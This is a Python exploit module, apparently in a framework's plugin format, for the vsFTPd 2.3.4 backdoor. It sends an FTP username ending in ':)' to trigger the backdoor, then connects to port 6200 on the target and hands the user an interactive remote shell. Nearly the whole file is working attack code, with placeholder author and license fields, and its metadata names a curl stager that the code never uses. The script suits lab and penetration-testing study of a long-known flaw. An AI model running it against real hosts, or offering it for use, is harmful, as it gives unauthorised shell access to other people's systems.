#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
from telnetlib import Telnet
from rich.console import Console
console = Console()

metadata = {
    'name': 'vsFTPd 2.3.4 Backdoor Exploit',
    'description': '''
        This exploit targets a backdoor in vsFTPd 2.3.4.
    ''',
    'authors': [
        'Original Author',
        'Your Name'
    ],
    'date': '2021-09-04',
    'license': 'YOUR_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://www.exploit-db.com/exploits/49757'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'curl',
    },
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None}
    },
}

def run(args):
    if 'rhost' not in args:
        logging.error('rhost parameter is missing')
        return
    console.print("[bold blue][+] [white not bold]Start Exploit vsFTPd 2.3.4 version in",args['rhost'])
    host = args['rhost']
    portFTP = 21  # Default FTP port

    user = "USER nergal:)\r\n"
    password = "PASS password\r\n"

    try:
        with Telnet(host, portFTP) as tn:
            tn.read_until(b"(vsFTPd 2.3.4)")
            tn.write(user.encode('ascii'))
            tn.read_until(b"password.")
            tn.write(password.encode('ascii'))

            console.print('[bold green][+] [white not bold] Triggering backdoor...')
    except Exception as e:
        console.print(f"[bold red][-] [white not bold] An error occurred: {e}")
        return

    try:
        with Telnet(host, 6200) as tn2:
            console.print('[bold green][+] [white not bold]Success, shell opened')
            console.print('[bold green][+] [white not bold]Send `exit` to quit shell')
            tn2.interact()
    except Exception as e:
        console.print(f"[bold red][-] [white not bold] Unable to connect to backdoor: {e}")

